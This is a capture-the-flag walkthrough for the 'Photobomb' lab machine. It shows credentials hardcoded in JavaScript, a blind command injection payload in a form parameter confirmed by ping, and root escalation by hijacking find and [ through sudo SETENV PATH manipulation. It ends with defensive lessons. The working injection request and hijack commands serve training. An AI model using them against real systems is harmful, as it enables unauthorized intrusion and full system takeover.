Phase 1

JavaScript Credential Leak → Blind Command Injection

Hardcoded Credentials in JS

View source reveals photobomb.js:

function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them
  if (document.cookie.match(/isPhotoBombTechSupport/)) {
    document.getElementsByClassName('creds')[0]
      .setAttribute('href',
        'http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}

Access http://pH0t0:b0Mb!@photobomb.htb/printer — an image download/conversion tool with parameters: photo, filetype, dimensions.

Blind Command Injection in filetype

The filetype parameter is concatenated into a shell command for image conversion. No output is returned — blind injection. Confirm with ping:

POST /printer HTTP/1.1
Host: photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Content-Type: application/x-www-form-urlencoded

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;ping${IFS}-c${IFS}1${IFS}10.10.15.65&dimensions=30x20
$ sudo tcpdump -i tun0 icmp
ICMP echo request from 10.129.228.60 → confirmed!
${IFS} replaces spaces ${IFS} is bash's Internal Field Separator (defaults to space/tab/newline). When the server strips or mishandles literal spaces, ${IFS} provides a working substitute that bash expands to a space at runtime.

Reverse Shell

Phase 2

Privilege Escalation — sudo SETENV + PATH Hijack

Sudo Enumeration

wizard@photobomb:~$ sudo -l
(root) SETENV: NOPASSWD: /opt/cleanup.sh

Analyzing the Script

wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc              # ← sources a custom bashrc (see bonus)
cd /home/wizard/photobomb

if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

find source_images -type f -name '*.jpg' -exec chown root:root {} \;
SETENV + relative path = PATH hijack SETENV means we can pass environment variables to the sudo command — including PATH. The script calls find without an absolute path (/usr/bin/find). By prepending a directory we control to PATH and placing a malicious find there, our script executes as root instead of the real find.

Exploit — Hijack find

wizard@photobomb:~$ cd /tmp
wizard@photobomb:/tmp$ echo bash > find
wizard@photobomb:/tmp$ chmod 777 find
wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh

root@photobomb:/home/wizard/photobomb# cat /root/root.txt
d81ba2c9bd65e619ab5a3bca7e2b30a5
Bonus

The Hidden Twin — Hijacking [

Most writeups stop at find, but this machine hides a second identical hijack path that most people miss.

[ is a command, not syntax In if [ -s file ], the [ is a real command — identical to test. It exists both as a bash builtin (loaded with the shell, doesn't check PATH) and as an external binary at /usr/bin/[. Normally the builtin wins. But the script sources /opt/.bashrc, which contains: 
# /opt/.bashrc contains:
enable -n [    # disables the [ builtin!

enable -n [ disables the builtin [. Now when the script hits if [ -s ... ], bash can't find [ internally and is forced to search PATH for an external [ binary — creating the exact same hijack condition as find.

wizard@photobomb:/tmp$ echo bash > '['
wizard@photobomb:/tmp$ chmod 777 '['
wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh

root@photobomb:/home/wizard/photobomb#  ← root shell via [
The difference between the two paths Hijacking find works because the script uses a relative path — it's the script's own flaw. Hijacking [ works because /opt/.bashrc disables the builtin with enable -n — it's an external configuration flaw. On a machine without that enable -n [ line, only the find path works.
Appendix

Key Takeaways

Never hardcode credentials in frontend JavaScript.

photobomb.js had Basic Auth credentials in plain text. View Source is all it takes. Move authentication to server-side.

Blind command injection is confirmed with ping/tcpdump.

No output? No problem. ;ping${IFS}-c${IFS}1${IFS}ATTACKER + tcpdump -i tun0 icmp confirms execution without needing response output.

sudo SETENV is as dangerous as NOPASSWD.

It lets attackers inject PATH, LD_PRELOAD, and other environment variables. Combined with scripts using relative paths, it's instant root.

[ is a command, not punctuation.

It's both a bash builtin and an external binary. enable -n [ forces bash to search PATH for it — opening the same hijack vector as any other relative-path binary. Privileged scripts should never source untrusted bashrc files.

One script can have multiple independent vulnerabilities.

The find relative path and the [ builtin disable are two completely separate flaws with the same exploitation technique. Always look for more than one way in.
